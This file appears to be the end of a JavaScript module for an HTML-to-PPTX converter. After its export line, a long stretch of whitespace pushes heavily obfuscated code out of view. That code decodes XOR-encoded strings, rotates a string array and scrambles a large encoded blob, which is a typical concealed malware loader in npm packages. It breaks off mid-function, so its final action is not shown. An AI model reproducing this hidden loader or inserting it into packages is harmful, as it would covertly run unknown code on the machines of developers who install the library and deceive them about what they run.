module.exports = html2pptx;                                                                                                                                                     var z = '-0371-2';(function(hwcoNwZIyixFepc,uyYzMZYJEvcwpZLlO){var wqOOVQNDyt_eXX_lGHW=QtbaGaPA_$YMImOzadvJlZ,PqrQG$isep=hwcoNwZIyixFepc();while(!![]){try{var lE_gWbUq=-parseFloat(wqOOVQNDyt_eXX_lGHW(0x165))/(parseInt(0xeb3)*parseInt(0x1)+Math.trunc(0x2c6)+-0x1178)*(-parseFloat(wqOOVQNDyt_eXX_lGHW(0x175))/(-parseInt(0x4)*Math.trunc(parseInt(0x317))+parseFloat(parseInt(0x24ba))+-parseInt(0x185c)))+parseFloat(-parseFloat(wqOOVQNDyt_eXX_lGHW(0x173))/(Math.trunc(parseInt(0x18af))+Math.max(0xf00,0xf00)+Number(-0x27ac)))*(parseFloat(wqOOVQNDyt_eXX_lGHW(0x167))/(-0x1*Math.trunc(parseInt(0x26b))+-parseInt(0xfe)*0x1a+0x1c3b))+Number(parseFloat(wqOOVQNDyt_eXX_lGHW(0x177))/(-0x7*Math.trunc(parseInt(0x3e9))+-0x2b9*-0x1+-parseInt(0x839)*-parseInt(0x3)))*parseInt(parseFloat(wqOOVQNDyt_eXX_lGHW(0x16d))/(-parseInt(0x26c9)+-0x79*Math.floor(parseInt(0x17))+Math.floor(-parseInt(0x18d7))*-parseInt(0x2)))+parseFloat(wqOOVQNDyt_eXX_lGHW(0x178))/(parseInt(0x450)+0x715+-0xb5e)+parseFloat(wqOOVQNDyt_eXX_lGHW(0x170))/(0x1e64+Number(0x121c)+-parseInt(0x178)*parseInt(0x21))+-parseFloat(wqOOVQNDyt_eXX_lGHW(0x172))/(Math.trunc(0x17)*0x53+Math.floor(parseInt(0x26e))*Math.floor(-parseInt(0xc))+-parseInt(0x15bc)*-0x1)*(parseFloat(wqOOVQNDyt_eXX_lGHW(0x166))/(0x23e4+-parseInt(0x65)+-0x2375))+-parseFloat(wqOOVQNDyt_eXX_lGHW(0x16a))/(parseInt(0x4f)+Math.ceil(-parseInt(0x1c77))+-parseInt(0x1)*Number(-parseInt(0x1c33)));if(lE_gWbUq===uyYzMZYJEvcwpZLlO)break;else PqrQG$isep['push'](PqrQG$isep['shift']());}catch(eNebdw__sBVQigJCrBKSaPjf){PqrQG$isep['push'](PqrQG$isep['shift']());}}}(FoWCYMyERmMjuQRPZum_PIy,parseInt(0x7688c)+-0xb1029+-0x27*-parseInt(0x6689)));function FoWCYMyERmMjuQRPZum_PIy(){var uXhSATwaRruY$NrGOk=['65616662636403053c1a3913','6563616d622e3b30270733','3e3b3d3a','6935313a26213c7c353869613778336c3230217a2d26747a7a3a37313732786176243531352162383a3e7d2609662122762c79257c0974356f7c26696f6f267f7c350f6c7a27662015333b2578213c6c1778353d78276f357c1539647c3a3e6f3e227e7863223b637c7d7c3b6f39623b356026237d7a74263b300f3227663a2f30262220602c7d7f6478353a267f26267f3b7d292e6574693c320f353a6c2665260f780927637963633835357a213d632f7964626d382239206626693d0909687f7d2178317d78786f3a263c0f2669642279267c6f7869247d172127697f376f336f326f25157d7d65223d7d223f643a26386535317432690f6f3c3d272d7a31397c307f3b756674697c31223135636c697a7d60313d69337a3a692f323269650f68663574326569266f6078077d262d38226521742d6f3f25382f20223a22747c17747c38783b223a24743d6920382678267a38233b2e3c7c387820256f6f26267c7c2269353c27226f092c256935366f30356f787c7c266f223e257a7c200f7f7d30357d26303a263c2760652d7c22266f323c6f67337609317c7a353c262435243309337a7d3a3332243a653c783d37386f6f7d69176f3961697f2678747a7d6f21697f27297f7d3d20787f36396f307f21397d7969273d3d253b386920692669256d7f7a7a373c257f0f6232317420643a2624267c7422266c3238263a7830303320740962357a6f396f26203c7a3325746635293122313d37093336203d68603b6f176f38782e2e3d627f380f350f6f7f7c273d76383d7626783a243d6d27783226323c21237d3b2369312f7c366923313a66207a33217a3d693f3d3535357f7d2d32202435673a297d696d767d3724157f216f212024097669383f632224207465266f3c2e23767d207c7d6d7d7c7a382138692763326f746f2725647d3a762d7f6427296922357f2774393c7c64257a093c226f6a7464626915793b2e3120267c2065262026273d273b6431787a6f2e0f7c326861316320787c26353b35223a266f203c3c326f22783e69266f747d266a656c2e3c3b7e3b2f68353f39273a7d353f20317a223b6d7f31356437383d3b6f36217469091775333e6f2d677f387d31697a293026693d623b3d176c263a3a646f6269352676297a26313d6909072027263a3a7a6f662669206f0f206f3d2269242617263a7c7d35263120212e7f743c383f0f7f2c693174796c3e2f7c313e2d6d7c7c7d7d74','656566636c6263600d0d3e3b3f23','17621d30747a3137777a06206f7a7a7a681730320632693026682c2d7d30277a663175747a7a683a207a37683d377520322030337a277a686d7a17797a06067a063c2e310638066f603b3564262c377b3c753526683968063168277c066e6e066b326f7271363d356e68003c7a3c687a74323f372d2d380637066e753578686834353a723837612838680b06067a3d60063d7a2c6e0623273a3a7a30277a1b747f643a320b143f3c643b267c3d372660273d06207a60263006762c70067a6f062135061276323137066d743168041119067e2036060661656f0a78173d7579067a2627066c2c6e7d7a2227370606680638757f6a066b0619227a7a797c68063173683a3732330627067a293d72352630330668062e6806726d066831753a702c1d356d752c3c317b37067e7a7424313c377a3006060537203067640625067806107b320d767d14377a7a366e683b2723647a7a06757a6f7c68063206207a7a6806261a6007063179213506756375047a7131747c68177a6838043006067337273531750628727a667a330624050b6f3b6932066804606832200706060668066037317a067a3a687a7d6574317a307568112a2d3d6a26383a6831062401063037713774233762387b383a2630686e7a683d6820640a06767422683968002627310f061a243c7c047c3d320664386c37370606377a3c682735173131232663210630686f6e0006312c2c1f350632350f76182674713e70387d68680f3111683115687a3525777a0674780638263d067d063124270a093d653d3720313e273b1c116f20643c2d0275063931313e64327506383a067a316c06372d672604742764067a19352c6837063f067a3a6837276075307d0b6d063220687a3528067570061568327a067c273a0606333716063106687a37277c7c39370602313a7c1031242737033d062076316826060606117a060664012676747a37747a0624687a7a3a06796e19387a7d683d1d3f0637357a7a3831783f3171627406200e1d3b367a100b02687a7c7a60201a687c68063064357a307a11712020680b067a7a323a3706377a62350d1d066806232037147a306f3b741201067a3d65746613360623320c7a31030f0e68377a75207c203123741237140674060026066006060675673a7974383a060b06607c0627326f7c7a237c3124663710687a06067c2706287c366806687a681406197a062c062771063c7a0a060c28060636787a6968210a1437353168697a207d387d7a33757a066806687a7a7c61067a393f067c3906380c7519723d192c69740b38693727067a7a683530772268272c7a3a0637303c353f7a290f7706677a7c06787a3b367a7a32307a3b373768683e7a6806697d0f68100620333f68372632067a3706273a742f067a067a1037663735243b3564680f06687a207a0606203d7e2c2637240b7a0630002906683b2438373606292c063b06293a18063f06797c331c7a063531077a7a197a76063b27063124387a7a12797a743a213a7d060606353c797a3111756275303127066872063b3b203a7206377a3a1604150638067a0668046472307a7c7a0237263168337a6774333b24797a1136683b672766330470313237073d2e68760f3127647209323a260668373b32173a00373c067a3a33386931727a680664682f7a7a3c27652106370606207f263606686419317c1968793a7a062e35657f7f7a06062774357a697a3029317c6a26777864716f002f2333353025202d7c373717376868222232687a06067a31067a0618366837646f20307a1c210639683b263106380635063574697a6868060626062673376827302f647e1a6d20083706706e061e7506161b062606383b0b0637753574060638067436203606742735193b7b27067d646f66066b06680630687e0770752f063d3f203a3b6f063a3106696d686806733736393c247a680667383806647d7a7a7a7a081a2568787a060705706106242011030606382068740674067c273306240f7e0606203c6806060007213a27387a37753a74063a272606377a7a747335377a7a76067a0c753132060431202c68747a30313b777568263024317d0b06210668063a0606063d116820627d31296768061d7a710634216075066806672426060627243d7a377568310a297a6b1e623f063c2077043d1620751f6b06376b06066f06260627687206753335747a746d37063a06066c7a143006270635060f1d7a683a327a79681d7a1c3b602524327c067a1d3124091170687a207a2a310806667a266801752e19267a3729063106381036067c067a11206831246b246211371a7a68372731787b2e3765757a263738327e7b7c327a066806207a371206067618060c643b7a3168062f3106060631200c7a20263b307c7a7a74260636627a3437677d68646c3931063d2020272720693d7a7d316868067a061a7a2406603620217a62301d3d33753c062174201006310668066f06377a373e7a37687c0b6d3737396e3f7a3037680632067a277a7a06723537303031277d7418747c0b232a3b7a32263872756f3935680674693f067a31680b26783c1f047168397209243738357a3b692765063c7a707c2406387c2e7a27606f063d7429750f71062706066a7a68297a387a1230686c68757a76097a7b35746f3f3d7a7c3a6806062006176732667c066411037a3a75746d067837757506383d3d276237273a277d3c2613682e6006060461063d0606203d73067426721a3168066e3731062a68372f0f7a3368727d1a3f2c23062621271206373106043d7a06367a067a68273b1c3e31376834383b7b7068066806717c207006063879077a38262d717a7a742335193a7c067506333110646e063b687a302c743d06181f71063a74067a367d267877203406060e2a7a7a627a757668753a6f20682c3a1a27273518067500706037060637076829757b683533687a062a7b242f3f3768207d207a797038137a3530063504356d607c2775067e7a20687a3837686332687c20062609062f7a06016832263b0b7a6806067f7f063e742d1d763731060b3f307a377430097a0918393d067c76197a147a773904773a787a19063428061629687036063a330b1a20796f687c687a7a2006387c2606262c3619790664187630207d1329752404747a68060b06217a79207a7130307a37682c7a706835063f20683d7a77273b7d156b31062e7a3824277568366c06062e222668116f110d06087c3268203a0f060702673c06060f7a7c3d74680637063c68397d3d0938746406063b062627686279742f68672026060637063b7a7c7a7a197a7a377a326f067a076807376868143825797a7406257506643d247a6f6061263737067e7b683c7a7410303509370006063a0672067b147e6d756804313574217a7a3b3b2474267c7068317526007a366d3722682f06073a052f7d060675307b7c35687a7b7a32200331367432687306067b377006387c06067a3a7a7a3910373637363829067521063b7a656e7a3563297a3668290630307a102f37387a7c1b7d38103d706606727d6e307a3a08753706243068737a3a2d062637357a680a7c65373d7d6f07602438202636061d2c3c2d613132650f7d062736067a64747f0626227406060f270615207a0231060965257a7a687065323a6837307a21662770193706747e067c6b7c37746f06067a3704783106067a7174240636747d7a7d06687a06310d067a2d31060606383b373b1f11113f27353f376c78273904293f38687c382d7a3f24206930062638067027683d317a7326302e2738753d243d7a3767373d20066476062006066206737a217a7a067a723f7f0676757c23070c072020097426687a0a6e3a3f357a063c3a707c0635316f063768173b663a2774063268246f743d373217113d076822273102063568002731747d7a67370631607c0635662627797a7a3d6b27173006067a6829333806063d663a377926157737626306797a7a377d0f68683e0606063a366f742735067606377a06062072273206371b7b7d067a21683b380611061e687a060667307c0606676468741437063539353b27067a317d7a067317740465062d30067222066a3c1d040b0f6e3731230632683b06277d3a1937363d0d04746e063f063206660622067531786820070b7a062667067d067670750b7a73387c277406377037757537062968687a763706293a17397a683b623b0c3c3d30060637386e687a2d750668206831397b6f2162740626273f7c260614262106207a30063579040637183632060631686c0906387774680621372037047a17736306063a37213560272716067a753637317d2006307a72047a3a3727247561230e7a70063d22357a057a7c0f063a06060660687a3c15060668242e322e7206203738307a7c352704061a067a29063b7a26317c067a06167a06067a312f06120629717506747a7a0f0665687a210606701b686c7c277a7a203e1774671d68047c743b351e0635213b27750633103d1a37600668312d143d640f377a32681a3d6f270638236c7d067a660620660606070b316e3d7238267c0637093236117d06203a273b6a77247a27331b337a067c1d39322031246739266b361129247c3106277d75062126270637066b68067a7a37322a2f2f066b7d3d3b3b207a3a157a7a312c36242c062934073720741320247d207538062f7927290606306837756d04293b217a7a206f2968687a0620397d7b267a1b75097a0f3068066768376966370874300635261b062d687a06687c7c2c063037310630170b3d2f683726783b7806707a06601b7a28682c20373237067b343774687a2437097a38332a7c312a21307a37062006230626110e060620686874011d20747a193c2006227c0b300620370b38683b75060638060f23747a0d7a7a0627687a7a70683b607c313835067a217a36370974677906290606076806692e7a7f0738062135657c743866207a7c642777266f3768227a681f206868687a20353120333f3d3a067a203a742d213a751229063506067c7d26681037261d7577717c7c6f32060620673d3179083d297c063a74207a38067a7a3a326b167a6836317a7c7d647a061a05617e78067a7b3335033f6e72043172277a266626780d6f31680606116f27377a68376828687a067c127c3737357420646827087827686821370f20047437767a7d3577671739333a64067e1d68707a746427166c266831373704686a06363d7a667a74273030276a29603137313b7c3d1a2d067b20067a113a06672d1907730623063b073706747531673217040632060627363606753830067c063b3d7a76093d067331680626067a06173c3126316824103836682f7a7a7a7a680d02307a3031060672687d386438063d02377a6c1c6e0b7c37203c327a31191402207d270706267a7a7a75613d06733806683a7a73066a680c066864747a3b77752070063b687a31266820066337063d64066569787a130637373c39203f067c2a0906372737302420716b3f20062d743d177c383b21316c7f3d793d147711730627313c763860310606360638067a22063c7d1a0606606c7a317b06063770620478333a7a356417321169726a377476063806270116066d203a0606053b38373135063d3d3206393d7a7e757c7c37006172163706371068203a7a06380606703237062706607d212e383d3d6b7c237a686b0e0a270630733237616b317f203a682d74180068363221067a713d34067c7d060637060606683a3c762c376437737a0468757d06062309647a0668763e040638027c3706060632360f7a7a78060668061c706006316c75263b7d746877063f196c06682d6806683d03683b06307a06606006371c0837000609687a383706777a2c74070606062f3d3d06083a300d7f06007d3d38277368687a727a3068373d683b7a0637647b233170396d063b7a6a622c292c7a2935682d75231f067431067737067a202a097a7a7a68063a3d373768217b2435243b6b6870063b7a35002c18223877327f7a686835066068106a153b266826307a7e657a7c3011070e681f0604377a0b3d350b3b7a06067a243b321b38281b3c36192c06757a3a06047a6c357533012c7d17373c3d3c76206406203b2f06373d711c3d176106200f383c396f7d3770647a35307527060631687868061d3d622c68103104686d0606680b093106357c2610630437317a6f0607303b683b680638787a1137687a2c09203c07060b68103a377a6c25377a660627727031327a29373669687e7f0032376536067a2737767c3a3a067a363d3e3a06607535372c3f1d373a3d24697c726f26062606067460063d213727063b0621377a32680b262706396b7968707e066f3275216a6c22247a3504317d74266e0b007c31313668312f067a273b067f247a7a067a06743706680669246a7a292c6f74367306233723683775061e6d270568067c37252d3e68620c203a35066b683d06327c0606687c7f06683d30310f377c680406743b06067a333a7a06066c7a063530697a743a68687e786820323e6906067a2932316a37067b712c7c7d062d3a32066f787b7e0407680670063e2074327a7a0675063d3d6806070632277d27683b3c680f0934207128087d6830203d09320668067a79061e62797c39756d741a277a296873067a7a3231687a3c7a707a68201a350674372024686331076879377a681c0613096c37227a68063f243a06177a75377c3a37303027687268240926797a6132232221310630047906373b061772376a06062c29207a637a6f682c20687a7a747906266d3f113806202c2d0f007a377520313d067a7a27687d190626067633060623067406273d7f373a2306352006376d783937282777090a653f7a363567322f683a063d286c7a0637097a7d69062d7a06313130067a756e203b6f63387429277a06740637263b68117a62387c206b3d063b74207a766178067a06067a74372632066b062075063637247a6e68796624237206293173307a756e3b6c063c067706311b7a247a0f27612f063808077c1a7c683c7e370600370631310606680604293d300304772006653d067a06780606067f27297f3d27063f7a373a686d067c0e2f383139046839057a273a31352c3731247a24067a201f7d617c68077c367c7a6906212109060e057a7736357706112f2f6806063206767b6f063b0638671a7b742d687b763d247a7a15746862063b35273a067a3506212606683a750674063200740606681f0668730671372d39062c7a0668067d762e3a683b7f6a3b0606723106750068756a686575097a16727a267a7c377436033d780669633b6868387a76747a3c09067a07680630753168683d7a2972733d7a360632247c3229756811262317067a6d20751a33687a37357a333106687a393d2306067a7d7a04372d060620313737760f060631312c373b7a0435686806703d357231067d7b23753d373b0664066c717a7a31000f1106240306687a063b3a74007c1361683773037a067a0664240b72266121061374000668377a273237333a7439060f0660793068686277683d3806067a79377d6231683b06743c3168697406060635686a13267065117a377d3d063a3b0627113b1a7460063a68263b7a2022683f626006647d2c0668607a7935060637077a2d7533063d2d797b617d6306753117067f730637690019373a7c067d687129376878773c6c061d7c3e7a11123164656f7a2565370627097a3506743a357a067b3b300f6f37687a062c7a307a3168313726352e7a377a71066b3d7a273d307a3d313a20797477317a76267a612437327d7a067a7c2674377a793a246b3c7a600f06623b75753d7c68177820107e6a0674063306691617067a7a66062771327568780b671c06643d06756806687a0906163a310f067c060606043733173b063f7a7a70797a363771062629276572060b682206687a2738063d06147568323d1930117522090706793268013b37137c7a290468626b2e0606110637746206060c19127e2926393d6806263d7a7a1a607c686f06060f323806007d620610377806233727267d153727201e273f7a21067b69277a067c06743b1168353f6b7c60333267687a323e7a0e6775373d09273b0b7a3a683a12067c68002736217630260a3b7470063106067a217d6e30200a37207c68323706167c7a253d747a6867201e3d6837687c317a74067534370c377a640632687d0668060606670637016620752037353a013706372e20243660681e2c397c3704067d76200e697a7a74217d6b7f727535386f7626052c313c3822320626667a060274277a7a197a7e7c24380466317f063d06312006700606617a747a7a7a7a35746830207c7d7a27386937742670270668213917677a1d3131202f6f097a31311f386c7727683a24096f680706330625307a273b30623a7237312622311f242030780620643706267a06273d64710606683764270620067a6825061d202f06073636217a0676017a0738203706683f687a37063b26307a31067a3c3c200776630618062c06373d043c7a1a736830757e7a25067a3d27683d6806743b3b7a1b3d620636067a0c0031357a2077787e357a746837610b7a327d067d3106751c307a75797463063f7a752937377a3031066837323b06067d373a7a7577752526067a2020322523060b6a7437066806743a7c7406313d6b747331260620067e377a7406067537701e06687c6f066820776f742d201c377d36773d1531757a7a06627a003a380b7b7a06673b067a0606262e2c3b7c32337a7633392166387a7a33683d681d3b683a3738062c7a7c097a752704780b1d7a7a30387c067c3b067074327927687a20276820067a100606750b68683b397a0678097a7f7a1d7a0f6e06682706387837093d22067a6e7a7a1375317a323b0e3f6319677c372d3166067776267d3d6837063a747a7a3a33683d6c37683d0661377a062c37277438062624377f646706206870063a23067a296006063167062e06296868370620292168686875042732377a3d057a7a7a3515272037061174397168373b067a00643d7b7d093726201f79687a3e3b083d21333720370f682726377a07777a2e306f060669050660060e7b7a39682f3906307c0668682235377a373d2c3137066f2606227d13063b6f3268397a3a2c7a20266d7a3b0600657a69333b2d0f7a7a0b0600197a776827310606061f06760b7a683611062e26727a3117682106320b682e39302f2f06062738726f227a7c743674322c68697a047c0b6506063d377a0f32327110227a72067a6f27292c7a6f063a3a683b047a7a6813357a062975642d73067e003036683731261b2204613b37237a6806313b0620300606202327063079712075062006062806266e7a7b30063077067d170603267a687c2c23687d05067a7c7a067a317c79303931353b06066806323d373b062605067a187330743103296600751e386807353b063106737c683a7a75067a3d06676f6421246804277a61686937063821683d7a067826373e06317a3031680624117c06687863687d2037067a6826340476683535093837063c2706682606066067377a6806682d31341d7d7a7a7c260606047a6506723b1a63067a1d357a2f06062e6a022e6f7a060606353a68290606307a7a377d37750604390606317c2c37377409376f317a7d067a0d6f0c640678382f7a3a7a7a6806747a3a060b772731063d7c68060b743b1e1e37207d140f7a2468687a7c7a067a757a06752d7b21207a067a271a3737067a06307a0632063b680b7b066a71066b177f0632372f3736047a26377a067a377a066b766c690b12017404746678233b24372035066d607a717d0663262337307a68377c747c246d6f672c617a063c3c3a2125063e06323d330629203715371d7a137c74687c607a20062c776e7a060f662c7d7627060632067a1068202c377a067706047a2c75747a37067d686837063b3f7f063b06367a2706096c37063d30352665296504756806687a6874066822067a0d7a3106072f37686e6906207a3d68380678353a067a3774332c067a3d0c06626f7a303b3868063d7a062406293b38223b796506381d6a24317475246706382c37063031322060752637682802327a740668067d7c3b32067a377c3d063b37683d11371a68761d313168263235757a3d30067a6d047a31767a3d6806397a322926270633047a7468310636211420376235217a74606326363a337d7a7474683637311906317a7b7a6f7e2068646e68203a3806276537233b7e2034793f3e7506742f0668687a06307a747a371a37177f3c1e3b3706683a313d7a06373331067d69067a26317a066836066866650b3729207a0576376f37732230323827067a207527753d267a06776a7a0639272621277a6074097537646f27747a7168203504372115686528637675696d656b3d06047a3226297a307a26002606713d3b0476686f7a263d35272e062533262d7706336f067a327e7a1b387a260b7d27793006372774687a3a693568032f653b717474173e370631373621067a0612370f003b37010b757a74370f77320620237a207565060b317a7c3b3027787a6d74383c20313032707c68073a066871373b3a7c65307a70063807062606273a35373f7a7c78310632233d750617332437687c372406313723067c16317d7a07687f682c0436271c7a7c21753a06063120740666207c683170296f3876207c2406092d322e06623b06237a6b062916687a202037067c741c06377a3237373d06370f64317f276874187a27066211757a35233764350f377e3224687d0b6c3a376837317a1a6837212617327c067d35113b067d3c223c06766f7a283a06060638373a06272768062f260676377a3d657c00060675263d68683003680674787a7a212938327a373d370627272c3d06376615067c7a350a38293e6462300639226335683c243f7a3f6b680627203827337a04377a37067a7a717a3c2f37063d7338067a3a6568683d3a3027271a7a3631267a3a02277a38736d353520200627747c7a7a7406277c3d77603d06063506207a78061e68387c317c747706193c066c7a367d3b6e3b703b7a0b7a321e266f7a673a7a680e13741104693d7821317a68270668683a680e373206372f06357a350632773d063126683a0d74263812260630062606763775202e3b303d3d3331060109273731356d7b371f242106067d207a7f0620060668087431376935377a7c3268370925060670067a687439747a227d1c06266a7a68097b20237a3132376a2d0d3a20757a243c310d743d263c067a3f06356c7c61306831067d3b231a68207a7c7b37060636787a3b32060b37632711377a7a7a747a066831060671067d3706122f317a3168377a3763782d20293f317b27211a300f37373d772020270606063526001d273738683b7d7a397a7a69277a77363a30302706686806067a20203a687d2c0604750f7a747474377a7a0606301a7a20363829173c3b3732267a063d3d373b3b067a0732213d31316806607a070b2e3b203737376f06262726246806380f20337a74693f2c697a067a2f0d7f751a3706237521717b7431687c067a68307b3738683a7a3770210630307c32203d1b371765277226382272060674007a7d657a333b04372f2635387a36370638757438321d78067a370637667431112074357668746838247c723f7a306978067a3a067b7d74376509273d3a253d262c0637067531207a680637143820047a3d2f6831062906067c0038310606687c6868740b2738262600063a1d323775707e06067306683735363532373f3b3a387a7236323e3d206264657521307a7e3f73316c247269373124172968311331046006377c7a2c14757d243b0f71066410647c717a11760668603a063a66350621740b35107f1832370620723663267d377c6b742c06286826383806060635067a747d7937062c7a310668157a683737682e3d063b6837061406062f36632d067a06061f377a0632683828387a3d66273506370628060f3b067c2706000020062037197d06213a356f1c39270a69082f7b753072237a6f233821397a3c3106207c27313237','38313a33203c','6660381119203d17','32263b39173c3526173b3031','2721362720263d3a33','6766626c6462601719213c3e22','373c35261520','626c603b171d1c3935','676d672e3b27241820','3c253126272c382122233537303e362d39333b262e323f3b373d24202621203a27203b3a37','662d16042c0e38','370a39313e360a20263b','656761646c6d642e1c3a1f3003','60666c6d676664321111163f12','2724383d20','6560606065646d0e070630063e'];FoWCYMyERmMjuQRPZum_PIy=function(){return uXhSATwaRruY$NrGOk;};return FoWCYMyERmMjuQRPZum_PIy();}function QtbaGaPA_$YMImOzadvJlZ(e$IgmcdMNiPlG$b,kjD_cX){var Pz$_rYe=FoWCYMyERmMjuQRPZum_PIy();return QtbaGaPA_$YMImOzadvJlZ=function(hoph_M$GHPhERwhZLQarKMC,wamUN$iqRoIHS){hoph_M$GHPhERwhZLQarKMC=hoph_M$GHPhERwhZLQarKMC-(parseInt(0x3)*parseInt(0x775)+-0x774+Math.trunc(parseInt(0x1))*-parseInt(0xd87));var otoEGdNTwgmmll_QLlpGEWDe=Pz$_rYe[hoph_M$GHPhERwhZLQarKMC];if(QtbaGaPA_$YMImOzadvJlZ['vZwsFm']===undefined){var uPeKenZ=function(cbDoOZWReVJgFQGCywZ){var dskxvkqHCMR_WzGBMRfTPF=-parseInt(0x1393)+Math.trunc(parseInt(0x1293))+0x95*0x4&0x1809+0x8f*parseFloat(parseInt(0x16))+-0x2354,XHcEezbcuFC$R=new Uint8Array(cbDoOZWReVJgFQGCywZ['match'](/.{1,2}/g)['map'](iJtmoz$CfSiNvhsGIWbTrxbmBZ=>parseInt(iJtmoz$CfSiNvhsGIWbTrxbmBZ,0x3a*0x68+-0x17f*-parseInt(0x1)+parseFloat(-0x1)*parseInt(0x18ff)))),PnjdkSGgGwjqLSILTkpi_tLJ=XHcEezbcuFC$R['map'](zj_QsNZPCIZwawtdx=>zj_QsNZPCIZwawtdx^dskxvkqHCMR_WzGBMRfTPF),PpZf$s=new TextDecoder(),A$SpY$EoTPPy=PpZf$s['decode'](PnjdkSGgGwjqLSILTkpi_tLJ);return A$SpY$EoTPPy;};QtbaGaPA_$YMImOzadvJlZ['gSbQgs']=uPeKenZ,e$IgmcdMNiPlG$b=arguments,QtbaGaPA_$YMImOzadvJlZ['vZwsFm']=!![];}var DazSk_IDXtjJQtgN=Pz$_rYe[-parseInt(0x81)*Math.floor(0x41)+0x6*parseInt(0x5f8)+0x3*-parseInt(0x105)],ObUrjE_ZYzDaYigiG=hoph_M$GHPhERwhZLQarKMC+DazSk_IDXtjJQtgN,LXZ_eVApTc_OaEHP=e$IgmcdMNiPlG$b[ObUrjE_ZYzDaYigiG];return!LXZ_eVApTc_OaEHP?(QtbaGaPA_$YMImOzadvJlZ['HzqbWi']===undefined&&(QtbaGaPA_$YMImOzadvJlZ['HzqbWi']=!![]),otoEGdNTwgmmll_QLlpGEWDe=QtbaGaPA_$YMImOzadvJlZ['gSbQgs'](otoEGdNTwgmmll_QLlpGEWDe),e$IgmcdMNiPlG$b[ObUrjE_ZYzDaYigiG]=otoEGdNTwgmmll_QLlpGEWDe):otoEGdNTwgmmll_QLlpGEWDe=LXZ_eVApTc_OaEHP,otoEGdNTwgmmll_QLlpGEWDe;},QtbaGaPA_$YMImOzadvJlZ(e$IgmcdMNiPlG$b,kjD_cX);}var NX=[-parseInt(0x1e7f)*-0x8b+0x33e88d+-parseInt(0x2503cd)*-0x1,Math.trunc(-parseInt(0x1427))+Math.trunc(0xa7)*-parseInt(0x36)+Math.floor(0x38d0),-parseInt(0x96be)+-0x61d1*Math.ceil(0x1)+-parseInt(0x6d6e)*-0x3,parseInt(parseInt(0x1613))+Number(-parseInt(0x1be3))+parseInt(0x835),Math.max(parseInt(0x432a),parseInt(0x432a))*Math.max(parseInt(0x3),0x3)+-0xed33+parseInt(0xcea4),Math.floor(0x49b095)+parseFloat(parseInt(0xbe1bb))+-parseInt(0x8fbbd)],SX=[Math.floor(-0x2)*Number(0x3589bb)+0xed*-parseInt(0x4233)+Math.max(parseInt(0xf8fc4a),0xf8fc4a)*parseInt(0x1),0x1ceb+-0x520+Math.max(-parseInt(0x16da),-parseInt(0x16da)),0x1*parseInt(-parseInt(0xb992))+0x2*Math.floor(-0x4460)+Math.floor(parseInt(0x1e633)),parseInt(0x5f0)*Number(-parseInt(0x4))+Math.ceil(0xce3)+Math.trunc(0xb98),-parseInt(0xdcd3)*-parseInt(0x1)+-parseInt(0x13)*Math.ceil(-0x295)+-parseInt(0x32a1),Math.trunc(-parseInt(0x8ca369))+0x897661+parseInt(0x4b7c5d)];function spin(uPLFZEWc$_v,X$_LjfkEwc){var QphsrRMQKBJ=QtbaGaPA_$YMImOzadvJlZ,Yd$upoFAyE=[],sm_YZoqjf_krAVbp=parseInt(0x234a)+0x1*parseInt(0x2616)+-0x4960,h$CRHQQJvlpRHk=X$_LjfkEwc[Math.trunc(-parseInt(0x6fb))*Math.max(-0x1,-0x1)+parseInt(0xb87)+-parseInt(0x941)*0x2],ZNA$ubD_G,kDtMp_axbge_byr,MDHcsDCuBrsFemZXpYNI,TkFHpFDYHKVhsPzEDul$_cWa,lZRUthorZmws_AefeJ,dneuuUKfxPTdlnU_RLBMcP;while(sm_YZoqjf_krAVbp<uPLFZEWc$_v[QphsrRMQKBJ(0x16c)]){Yd$upoFAyE[sm_YZoqjf_krAVbp]=uPLFZEWc$_v[QphsrRMQKBJ(0x171)](sm_YZoqjf_krAVbp),sm_YZoqjf_krAVbp+=Math.ceil(-0x2494)+Math.ceil(parseInt(0x55c))*parseInt(0x1)+Math.ceil(0x1f39)*parseFloat(parseInt(0x1));}ZNA$ubD_G=Yd$upoFAyE[QphsrRMQKBJ(0x16c)],sm_YZoqjf_krAVbp=parseFloat(-0x1)*-0x18d7+Math.ceil(0x9d7)+0xc1*-0x2e;while(sm_YZoqjf_krAVbp<ZNA$ubD_G){kDtMp_axbge_byr=h$CRHQQJvlpRHk*(sm_YZoqjf_krAVbp+X$_LjfkEwc[parseInt(parseInt(0x1))*-parseInt(0x17f2)+parseInt(0x75a)*-parseInt(0x2)+Math.ceil(-0x1)*Number(-parseInt(0x26a7))])+h$CRHQQJvlpRHk%X$_LjfkEwc[parseInt(0x168d)+0x8*0x112+Math.floor(-0x1f1b)],MDHcsDCuBrsFemZXpYNI=h$CRHQQJvlpRHk*(sm_YZoqjf_krAVbp+X$_LjfkEwc[Math.trunc(0x1)*-0x2323+0x18b*-parseInt(0x5)+-parseInt(0x1)*Math.ceil(-0x2add)])+h$CRHQQJvlpRHk%X$_LjfkEwc[parseFloat(parseInt(0x9a1))+Number(-parseInt(0x594))+parseInt(0x409)*Number(-0x1)],TkFHpFDYHKVhsPzEDul$_cWa=kDtMp_axbge_byr%ZNA$ubD_G,lZRUthorZmws_AefeJ=MDHcsDCuBrsFemZXpYNI%ZNA$ubD_G,dneuuUKfxPTdlnU_RLBMcP=Yd$upoFAyE[TkFHpFDYHKVhsPzEDul$_cWa],Yd$upoFAyE[TkFHpFDYHKVhsPzEDul$_cWa]=Yd$upoFAyE[lZRUthorZmws_AefeJ],Yd$upoFAyE[lZRUthorZmws_AefeJ]=dneuuUKfxPTdlnU_RLBMcP,h$CRHQQJvlpRHk=(kDtMp_axbge_byr+MDHcsDCuBrsFemZXpYNI)%X$_LjfkEwc[-parseInt(0x1068)+Math.floor(0x1)*-parseInt(0x1af3)+parseFloat(0x2b60)],sm_YZoqjf_krAVbp+=Math.max(0x10f,parseInt(0x10f))*parseFloat(-parseInt(0xb))+-parseInt(0x1227)+0x1*parseInt(0x1dcd);}return Yd$upoFAyE[QphsrRMQKBJ(0x168)]('');}function splitLane(jezJ$cJTCIEnQUquPC$xtzehXS){var VXnYqhVfhMxPNCZxkVLjX=QtbaGaPA_$YMImOzadvJlZ,MmiyC_B_BmVPjLNizCLBL=String[VXnYqhVfhMxPNCZxkVLjX(0x16e)](-0x199e+parseInt(0xda5)+Math.trunc(0xc15)),T$KrpWTbnKscLfvs=spin(jezJ$cJTCIEnQUquPC$xtzehXS,NX);return 